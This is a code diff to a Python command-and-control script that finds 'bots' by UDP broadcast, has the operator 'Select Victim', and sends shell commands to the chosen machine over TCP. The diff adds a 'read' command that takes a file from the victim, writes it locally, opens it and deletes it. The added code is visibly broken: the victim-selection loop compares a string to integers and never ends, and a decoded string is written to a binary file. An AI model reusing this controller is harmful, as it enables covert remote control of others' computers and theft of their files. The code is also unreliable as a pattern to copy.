@@ -1,5 +1,6 @@
 import socket
 import datetime
+import os
 
 UDP_PORT = 32568
 TCP_PORT = 32569
@@ -9,6 +10,16 @@ protocol = {
     "RPY": 4586
 }
 
+def view_file(command, data):
+    print(command[5:])
+    print(data.decode())
+    file = open(".\\" + command[5:], "wb")
+    file.write(data.decode())
+    file.close()
+    os.system("start " + command[5:])
+    input(">Del")
+    os.system("del " + command[5:])
+
 
 def search_bot(s, address):
     s.sendto(str(protocol["REQ"]).encode(), ("255.255.255.255", UDP_PORT))
@@ -16,7 +27,7 @@ def search_bot(s, address):
     while int(datetime.datetime.now().strftime("%f")) - t < 1000000:
         try:
             msg, addr = s.recvfrom(1024)
-        except socket.timeout:
+        except socket.timeout: # enters if more than 0.5 seconds pass
             break
         dec = str(protocol["RPY"])
         dec2 = msg.decode()
@@ -39,19 +50,25 @@ def telnet():
         for x in range(0, len(address)):
             print(f"[{x + 1}] - {address[x]}")
 
-        index = input(f"Select Victim: ")   # choosing the victim
+        while(1):
+            index = input(f"Select Victim: ")   # choosing the victim
+            if index in range(0, len(address)):
+                break
         s.connect((address[int(index) - 1], TCP_PORT))
 
         while 1:
             command = input("$>")   # entering the command
             if command == "return":   # in case of return we break
                 break
-            if command == "":
+            elif command == "":
                 continue
             s.send(command.encode())
             output = s.recv(4096)
             while len(output) >= 4096:
                 output += s.recv(4096)
+            if "read" == command[0:4]:
+                view_file(command, output)
+                continue
             print(output.decode())
 
 
